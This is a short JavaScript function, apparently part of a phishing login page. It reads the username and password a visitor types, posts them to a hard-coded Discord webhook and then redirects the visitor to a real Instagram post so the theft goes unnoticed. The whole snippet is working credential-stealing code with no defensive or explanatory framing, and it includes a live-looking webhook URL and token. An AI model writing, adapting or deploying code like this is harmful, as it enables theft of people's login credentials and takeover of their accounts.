function sendMessage() {
  function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1048711234184286298/-dhVGdhfdhKYVL54zYNUOL4mqdlNwm_6v2Cmb5gYeMRHAETbxgKNrolphWuVT5Yt9ih5");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
    }
    request.send(JSON.stringify(params));
	sleep(400)
	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
  }